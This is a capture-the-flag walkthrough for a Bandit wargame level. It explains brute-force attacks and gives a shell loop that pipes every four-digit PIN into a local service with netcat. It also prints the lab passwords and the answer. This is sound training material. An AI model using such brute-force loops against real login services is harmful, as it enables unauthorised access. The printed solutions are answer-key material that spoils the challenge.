# Level 25
Current user: bandit24

## Concept - Brute Force 👊
Brute force is a very common and known type of attack where the attacker tries to enter the system by trying thousands (and more) combinations of the password. In our case we have to try 10,000 combinations to get in! Sounds a lot but we can automate it to directly guess. Let's find out.


## Commands - Two or Three
Login into bandit24: ssh -p 2220 bandit24@bandit.labs.overthewire.org

Password of bandit24 : hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv

mkdir, for, echo, cat

## Hint
Find out how we should write the for loop in linux and try to write it and send its output to a file.

## Solution
Command to execute:

mkdir /tmp/bandit24_pin

cd /tmp/bandit24_pin

(for i in {0000..9999}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done) | nc localhost 30002 > results.txt

To read the results.txt but only the correct one, we need to filter from the wrong results so we do:

cat results.txt | grep -v "Wrong"

We get:

Correct!

The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P

If you're wondering what 4-digit worked, it was: 3976 🤯


## Voila!🎉
